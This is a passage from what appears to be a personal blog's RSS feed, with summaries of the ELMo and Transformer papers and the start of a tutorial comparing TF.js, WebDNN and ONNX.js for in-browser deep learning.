

  
  
  &lt;figcaption&gt;
    Baseline vs ELMo last layer vs All the layers
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;Including ELMo at both the input and output layers for SNLI and SQuAD improves over just the input layer. This is because SNLI and SQuAD use an attention layer after the biRNN and using ELMo at the output layer would allow the model to attend directly to the internal representations of the biLM. But for SRL (and coreference resolution) performance is highest when it is included at just the input layer. Probably because the task-specific context representations are more important than those from the biLM.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/layerloc.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/layerloc.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;The higher-level LSTM states of the biLM capture context-dependent aspects of word meaning (e.g., they can be used without modification to perform well on supervised word sense disambiguation tasks) while lower-level states model aspects of syntax (e.g., they can be used to do part-of-speech tagging).&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/contextcapture.PNG&#34; data-caption=&#34;biLM captures the context of the word &amp;lsquo;play&amp;rsquo; effectively from the source sentences&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/contextcapture.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    biLM captures the context of the word &amp;lsquo;play&amp;rsquo; effectively from the source sentences
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Different layers in the biLM represent different types of information and explains why including all biLM layers are important for the highest performance in downstream
tasks.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Using ELMo with a model also improves the sample efficiency. The model now requires a fewer number of epochs (parameter updates) and less amount of training data as well. For eg., the baseline SRL model requires 486 epochs to reach the maximum F1 score. The model with the ELMo representations only requires 10 epochs to exceed the baseline. In addition, ELMo-enhanced models use smaller training sets more efficiently than models without ELMo. Again, if we consider the SRL case, the ELMo model with 1% of the training set has about the same F1 as the baseline model with 10% of the training set.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/sampleeff.PNG&#34; data-caption=&#34;biLM captures the context of the word &amp;lsquo;play&amp;rsquo; effectively from the source sentences&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/sampleeff.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    biLM captures the context of the word &amp;lsquo;play&amp;rsquo; effectively from the source sentences
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;I have also released an annotated version of the paper. If you are interested, you can find it &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/ELMo.pdf&#34;&gt;here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is all for now!&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script data-name=&#34;BMC-Widget&#34; data-cfasync=&#34;false&#34; src=&#34;https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js&#34; data-id=&#34;shreyanshsingh&#34; data-description=&#34;Support me on Buy me a coffee!&#34; data-message=&#34;&#34; data-color=&#34;#FF5F5F&#34; data-position=&#34;Right&#34; data-x_margin=&#34;18&#34; data-y_margin=&#34;18&#34;&gt;&lt;/script&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Paper Summary #1 - Attention Is All You Need</title>
      <link>https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/</link>
      <pubDate>Sun, 18 Apr 2021 16:57:49 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Paper&lt;/strong&gt;: Attention Is All You Need&lt;br&gt;
&lt;strong&gt;Link&lt;/strong&gt;: &lt;a href=&#34;https://bit.ly/3aklLFY&#34;&gt;https://bit.ly/3aklLFY&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Authors&lt;/strong&gt;: Ashish Vaswani, Noam Shazeer, Niki Parmar, Jakob Uszkoreit, Llion Jones, Aidan N. Gomez, Lukasz Kaiser, Illia Polosukhin&lt;br&gt;
&lt;strong&gt;Code&lt;/strong&gt;: &lt;a href=&#34;https://github.com/tensorflow/tensor2tensor&#34;&gt;https://github.com/tensorflow/tensor2tensor&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;what&#34;&gt;What?&lt;/h2&gt;
&lt;p&gt;Proposes Transformers, a new simple architecture for sequence transduction that uses only an attention mechanism and does not use any kind of recurrence or convolution. This model achieves SOTA (at the time) on the WMT 2014 English-to-French translation task with a score of 41.0 BLEU. Also beats the existing best results on the WMT 2014 English-to-German translation task with a score of 28.4 BLEU. The training cost is also much less than the best models chosen in the paper (at the time).&lt;/p&gt;
&lt;h2 id=&#34;why&#34;&gt;Why?&lt;/h2&gt;
&lt;p&gt;Existing recurrent models like RNNs, LSTMs or GRUs work sequentially. They align the positions to steps in computation time. They generate a sequence of hidden states as a function of the previous hidden state and the input for the current position. But sequential computation has constraints. They are not easily parallelizable which is required when the sequence lengths become large. The Transformer model eschews recurrence and allows for more parallelization and requires less training time to achieve SOTA in the machine translation task.&lt;/p&gt;
&lt;h2 id=&#34;how&#34;&gt;How?&lt;/h2&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/arch.PNG&#34; data-caption=&#34;Detailed Transformer Architecture&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/arch.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Detailed Transformer Architecture
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The model is auto-regressive, it consumes the previously generated symbols as additional input when generating the next.&lt;/p&gt;
&lt;h3 id=&#34;encoder&#34;&gt;Encoder&lt;/h3&gt;
&lt;p&gt;The figure above shows just one layer of the encoder on the left. There are &lt;code&gt;N=6&lt;/code&gt; such layers. Each layer has two sub-layers - a multi-head self-attention layer and a position-wise fully connected feed-forward network. &lt;a href=&#34;https://www.cv-foundation.org/openaccess/content_cvpr_2016/papers/He_Deep_Residual_Learning_CVPR_2016_paper.pdf&#34;&gt;Residual connections&lt;/a&gt; and &lt;a href=&#34;https://arxiv.org/abs/1607.06450&#34;&gt;layer normalization&lt;/a&gt; is used for each sub-layer.&lt;/p&gt;
&lt;h3 id=&#34;decoder&#34;&gt;Decoder&lt;/h3&gt;
&lt;p&gt;This also has &lt;code&gt;N=6&lt;/code&gt; stacked layers. The architecture diagram shows one layer of the decoder on the right. Each layer has three sub-layers. Two of them are the same as the encoder. The third layer performs multi-head attention over the output of the encoder stack. This is modified to prevent positions from attending to subsequent positions. Additionally, the output embeddings are also offset by one position. These features ensure that the predictions for a position depend only on the known outputs for positions before it.&lt;/p&gt;
&lt;h3 id=&#34;attention&#34;&gt;Attention&lt;/h3&gt;
&lt;p&gt;The paper uses a modified dot product attention, and it is called &amp;ldquo;Scaled Dot Product Attention&amp;rdquo;. Given queries and keys of dimension d&lt;sub&gt;k&lt;/sub&gt; and values of dimension d&lt;sub&gt;v&lt;/sub&gt;, the attention matrix is calculated as shown below.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/attention.PNG&#34; data-caption=&#34;Attention Matrix Calculation&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/attention.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Attention Matrix Calculation
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;Since, for large values of d&lt;sub&gt;k&lt;/sub&gt; the dot product grows large in magnitude, it pushes the softmax function into regions where it has extremely small gradients. The scaling of 1/sqrt(d&lt;sub&gt;k&lt;/sub&gt;) is done to avoid the problem of vanishing gradients.&lt;/p&gt;
&lt;p&gt;Multi-Head attention allows computing this attention in parallel. This helps to focus on different positions. Secondly, it also helps to attend to information from different subspaces due to the more number of attention heads.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/multihead-attention.PNG&#34; data-caption=&#34;Multihead Attention Calculation&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/multihead-attention.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Multihead Attention Calculation
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The paper uses &lt;code&gt;h=8&lt;/code&gt; parallel attention layers or heads. The reduced dimension of each head compensates for the more number of heads and hence the computational cost remains the same as with single-head attention with full dimensionality.&lt;/p&gt;
&lt;p&gt;Applications of multi-head attention in the paper are given below -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/application-attention.PNG&#34; data-caption=&#34;Application of multi-head attention in the model&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/application-attention.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Application of multi-head attention in the model
  &lt;/figcaption&gt;


&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/multihead-attention-fig.PNG&#34; data-caption=&#34;Pictorial representaion of Multi-head attention&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/multihead-attention-fig.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Pictorial representaion of Multi-head attention
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;h3 id=&#34;position-wise-feed-forward-networks&#34;&gt;Position-wise Feed-Forward Networks&lt;/h3&gt;
&lt;p&gt;The FFN sub-layer shown in the encoder and decoder architecture is a 2-hidden layer FC FNN with a ReLU activation in between.&lt;/p&gt;
&lt;h3 id=&#34;positional-encodings&#34;&gt;Positional Encodings&lt;/h3&gt;
&lt;p&gt;Positional encodings are injected (added) to the input embeddings at the bottom of the encoder and decoder stack to add some information about the relative order of the tokens in the sequence. The positional encodings have the same dimension as the input embeddings so that they can be added.
For position &lt;em&gt;pos&lt;/em&gt; and dimension &lt;em&gt;i&lt;/em&gt; the paper uses the following positional embeddings -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/positional.PNG&#34; data-caption=&#34;Positional Encoding calculation&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/positional.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Positional Encoding calculation
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;This choice allows the model to easily learn by the relative positions. The learned positional embeddings also perform about the same as the sinusoidal version. The sinusoidal version may allow the model to extrapolate to sequence lengths longer than the ones encountered in training.&lt;/p&gt;
&lt;h2 id=&#34;results&#34;&gt;Results&lt;/h2&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/experiments.PNG&#34; data-caption=&#34;Experimental results when varying parameters&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/experiments.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Experimental results when varying parameters
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;Form (A), it can be seen that single-head attention is slightly worse than the best setting. The quality also drops off with too many heads.&lt;/li&gt;
&lt;li&gt;(B) shows that reducing the attention key size &lt;i&gt;d&lt;sub&gt;k&lt;/sub&gt;&lt;/i&gt; hurts model quality.&lt;/li&gt;
&lt;li&gt;In (C) and (D), it is visible that bigger models are better and dropout helps in avoiding overfitting.&lt;/li&gt;
&lt;li&gt;(E) shows that sinusoidal positional encoding when replaced with learned positional embeddings also does not lead to a loss in quality&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For the base models, the authors used a single model obtained by averaging the last 5 checkpoints, which were written at 10-minute intervals. The big models were averaged over the last 20 checkpoints. Beam search with a beam size of 4 and length penalty α = 0.6. The maximum output length during inference is set to input length +50, but if it is possible, the model terminates early.&lt;/p&gt;
&lt;p&gt;The performance comparison with the other models is shown below -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/results.PNG&#34; data-caption=&#34;Model performance&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/results.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Model performance
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;I have also released an annotated version of the paper. If you are interested, you can find it &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/Attention%20Is%20All%20You%20Need.pdf&#34;&gt;here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is all for now!&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script data-name=&#34;BMC-Widget&#34; data-cfasync=&#34;false&#34; src=&#34;https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js&#34; data-id=&#34;shreyanshsingh&#34; data-description=&#34;Support me on Buy me a coffee!&#34; data-message=&#34;&#34; data-color=&#34;#FF5F5F&#34; data-position=&#34;Right&#34; data-x_margin=&#34;18&#34; data-y_margin=&#34;18&#34;&gt;&lt;/script&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Deep Learning in the Browser - Exploring TF.js, WebDNN and ONNX.js</title>
      <link>https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/</link>
      <pubDate>Mon, 25 Jan 2021 12:53:13 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/</guid>
      <description>&lt;p&gt;After my &lt;a href=&#34;https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy&#34;&gt;last post&lt;/a&gt; on deploying Machine Learning and Deep Learning models using FastAPI and Docker, I wanted to explore a bit more on deploying deep learning models. My last post discussed a server-side method for deploying the model. This post will discuss client side frameworks and techniques to deploy those models such that they work directly on the client side.&lt;/p&gt;
&lt;p&gt;In this tutorial I will be giving an overview of three frameworks, &lt;a href=&#34;https://www.tensorflow.org/js&#34;&gt;Tensorflow.js&lt;/a&gt;, &lt;a href=&#34;https://mil-tokyo.github.io/webdnn/&#34;&gt;WebDNN&lt;/a&gt; and &lt;a href=&#34;https://microsoft.github.io/onnxjs-demo/#/&#34;&gt;ONNX.js&lt;/a&gt;. I will be a deploying a simple pretrained image classification model (ResNet or Mobilenet) on the three frameworks and also tell you the comparsion between them. In this tutorial, I haven&amp;rsquo;t deployed custom models of my own but I will be explaining how you can do it and the difficulties you could encounter.&lt;/p&gt;
&lt;p&gt;The goal of this blog post is to introduce the three frameworks and how you can use them for deploying your models as well. Personally, I had not heard of WebDNN and ONNX.js before diving into this project, so I believe it can help some others like me to get familiar with these frameworks.&lt;/p&gt;
&lt;h2 id=&#34;tensorflowjs&#34;&gt;Tensorflow.js&lt;/h2&gt;
&lt;p&gt;I found Tensorflow.js to be the easiest to use. It already has a large collection of some &lt;a href=&#34;https://github.com/tensorflow/tfjs-models&#34;&gt;pretrained models&lt;/a&gt;. With Tensorflow.js, we don&amp;rsquo;t have a pretrained Resnet model because it is not exactly a lightweight model that can be deployed on a device with low compute power. So, I used &lt;a href=&#34;https://arxiv.org/abs/1704.04861&#34;&gt;Mobilenet&lt;/a&gt; (which is trained on the Imagenet dataset). Mobilenet was available in the Tensorflow.js pretrained models repository so I decided to use that directly.&lt;/p&gt;
&lt;p&gt;Now, on to the fun part, actually using the model and making a webapp. For the webapp portion, I am using &lt;a href=&#34;https://expressjs.com/&#34;&gt;Express&lt;/a&gt;, a web framework for Node.js. I have tried to keep the code structure and the webapp visually similar for all the three frameworks.&lt;/p&gt;
&lt;p&gt;Loading the model is as simple as -&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/dfedd9a445841a8bb963af9526a9f21c.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;Now after loading the model, we call the &lt;code&gt;imgSet&lt;/code&gt; function which bascially loads the image from the path we specify and loads it onto a canvas. Details of this can be seen in the code which I will post at the end.&lt;/p&gt;
&lt;p&gt;Although the Mobilenet model in Tensoflow.js doesn&amp;rsquo;t require a fixed size of the image, but for uniformity in all other frameworks (WebDNN, ONNX.js), I decided to resize the images to 224x224 size. The main code for running the model is shown below -&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/3b1bc92aa52a13cabae2f426b36c2576.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The final webapp looks something like this -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/tfapp.gif&#34; data-caption=&#34;Image loading and prediction&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/tfapp.gif&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Image loading and prediction
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The model works well. It knows it is some kind of a water related animal, and given the Imagenet classes it has been trained on, it gies the closest result possible.&lt;/p&gt;
&lt;p&gt;The first prediction takes time (196ms) because the model is loaded and run for the first time. After that, the predictions take very little time (~80ms) mainly because the model is cached and predictions can be served faster.&lt;/p&gt;
&lt;p&gt;The average time taken by different backends (over 20 predictions) is also shown below -&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Backend&lt;/th&gt;
&lt;th&gt;Time&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;cpu&lt;/td&gt;
&lt;td&gt;2100ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;wasm&lt;/td&gt;
&lt;td&gt;82ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;webgl&lt;/td&gt;
&lt;td&gt;70ms&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;If one wants to convert their own models to a Tensorflow.js compatible version, it is very easy to convert the model as well as load it into your web application. One can refer to &lt;a href=&#34;https://github.com/tensorflow/tfjs/tree/master/tfjs-converter&#34;&gt;tfjs-converter&lt;/a&gt; and the documentation given &lt;a href=&#34;https://www.tensorflow.org/js/guide/conversion&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The code for this section is present &lt;a href=&#34;https://github.com/shreyansh26/DeepLearning-in-the-Browser/tree/main/TF&#34;&gt;on my Github&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;webdnn&#34;&gt;WebDNN&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://mil-tokyo.github.io/webdnn/&#34;&gt;WebDNN&lt;/a&gt; was developed by the Machine Intellignece Laboratory at the University of Tokyo. From its website,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WebDNN optimizes the trained DNN model to compress the model data and accelerate the execution, and executes it with novel JavaScript API such as WebAssembly and WebGPU to achieve zero-overhead execution. WebDNN supports 4 execution backend implementations: WebMetal, WebGL, WebAssembly, and fallback pure javascript implementation. By using these backends, WebDNN works all major browsers.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;More details are available on the website, but the image below accurately depicts the steps involved in this procedure.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/webdnn-arch.PNG&#34; data-caption=&#34;WebDNN model conversion flow&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/webdnn-arch.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    WebDNN model conversion flow
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;WebDNN can be used to deploy tarined DNN models trained using popular DL frameworks like Tensorflow, Keras, PyTorch, Chainer, Kaffe. One disadvantage I found of using WebDNN is that the current model conversion module (as of writing the post) does not allow conversion using Tensorflow 2 and also does not support the latest versions of Keras (let alone &lt;code&gt;tensorflow.keras&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;I used a pretrained ResNet50 model (trained on Imagnet dataset) for this. I am sharing the &lt;a href=&#34;https://colab.research.google.com/drive/1pFdbZc5_Dd78twKshl-MH8T_EuVrH0Nw?usp=sharing&#34;&gt;following Colab notebook&lt;/a&gt; which contains the code to convert the ResNet50 Keras model.&lt;/p&gt;
&lt;p&gt;On to the web app coding part! The first thing the webapp does is to load the model.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/a527987583919e53b237a7d1a312f3a8.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;Next, we write the code to run the model on the image input.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/a7a9eb637f31e9dee0a2b39822ebc4b7.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The final webapp looks something like this -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/webdnn.gif&#34; data-caption=&#34;WebDNN predictions&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/webdnn.gif&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    WebDNN predictions
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The model does a very good job of identifying it is a bus. The top two predictions relate to it.&lt;/p&gt;
&lt;p&gt;Again, the first run takes a long time (~242ms) but the subsequent runs take quite less (~63ms average). Now one must note that ResNet50 is a relatively heavier model as compared to Mobilenet, but WebDNN manages to load it much faster than or at par with Mobilenet as we saw in the case with Tensorflow.js. Also, in the COlab notebook, we can see that for the same image, the ResNet50 model around 645ms to run the model. We easily see a ~10x improvement on converting the model to WebDNN.&lt;/p&gt;
&lt;p&gt;The average time taken by different backends (over 20 predictions) is also shown below -&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Backend&lt;/th&gt;
&lt;th&gt;Time&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;cpu&lt;/td&gt;
&lt;td&gt;10000ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;webgl&lt;/td&gt;
&lt;td&gt;60ms&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;WebDNN is quite optimised to run on futuristic hardware. The time it takes on a normal fallback vanilla-JS model version running on the CPU is around 10 seconds. But on WebGL, it takes much much less. I didn&amp;rsquo;t have access to a WebMetal backend, which they claim is the fastest. I would like to know if anyone runs it on WebGPU (WebMetal) and the average time the model took to run on it.&lt;/p&gt;
&lt;p&gt;The code for this section is present &lt;a href=&#34;https://github.com/shreyansh26/DeepLearning-in-the-Browser/tree/main/WebDNN&#34;&gt;on my Github&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;onnx&#34;&gt;ONNX&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://onnx.ai/&#34;&gt;Open Neural Network Exchange (ONNX)&lt;/a&gt; is an open source format for AI models, both deep learning and traditional ML.&lt;/p&gt;
&lt;p&gt;From their website -&lt;/p&gt;
&lt;blockquote&gt;
